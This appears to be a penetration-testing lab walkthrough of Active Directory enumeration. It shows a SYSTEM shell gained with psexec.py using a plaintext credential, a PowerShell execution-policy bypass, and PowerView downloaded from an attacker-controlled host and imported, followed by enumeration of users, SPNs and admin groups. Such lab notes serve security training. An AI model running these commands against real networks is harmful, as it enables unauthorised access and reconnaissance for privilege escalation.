> ### 参考URL
> - https://book.hacktricks.xyz/windows/basic-powershell-for-pentesters/powerview
> - https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993
> - https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet#using-powerview
> - https://nored0x.github.io/red-teaming/active-directory-domain-enumeration-part-1/

## Get the initial shell
```
┌──(kali㉿kali)-[~]
└─$ psexec.py david:dsfdf34534tdfGDFG5rdgr@10.11.1.120

C:\Windows\system32> whoami
nt authority\system
```

## Spawing the PowerShell
```
C:\Windows\system32> powershell -ep bypass
```

## Download the PowerView and import it
```
PS C:\Windows\Temp> Invoke-Webrequest -OutFile PowerView.ps1 -Uri http://192.168.119.249/PowerView.ps1
PS C:\Windows\Temp> Import-Module .\PowerView.ps1
```

## Domain name and Domain Controller name
```
PS C:\Windows\Temp> Get-NetDomain

Forest                  : xor.com
DomainControllers       : {xor-dc01.xor.com}
Children                : {}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  : 
PdcRoleOwner            : xor-dc01.xor.com
RidRoleOwner            : xor-dc01.xor.com
InfrastructureRoleOwner : xor-dc01.xor.com
Name                    : xor.com
```

## User enum
```
PS C:\Windows\Temp> Get-NetUser | select cn

Administrator  
Guest          
krbtgt         
Chris          
Pedro          
Maria          
Bob            
Ralph          
Bethany        
Bruce          
Sherlock       
Nicky          
Jeff           
Harry          
Kevin          
Cory           
Nina           
Brett          
Carol          
Daisy          
John           
Pete           
Adam           
David          
Albert         
ExchangeService
extmailservice 
SQLServer
```

## Enum SPN (Service Principal Name)
```
Get-NetUser | select serviceprincipalname

HTTP/ExchangeService.xor.com   
HTTP/ExtMail.xor.com           
MSSQLSvc/xor-app23.xor.com:1433
```


## Group Enum
```
Get-NetGroup | select samaccountname, admincount, description
```

about the output of `Get-NetGroup`, `name` and `samaccountname` were same

## Admin Group
```
PS C:\Windows\Temp> Get-DomainGroup *admin* | select samaccountname

samaccountname                
--------------                
Administrators                
Hyper-V Administrators        
Storage Replica Administrators
Schema Admins                 
Enterprise Admins             
Domain Admins                 
Key Admins                    
Enterprise Key Admins         
DnsAdmins
```

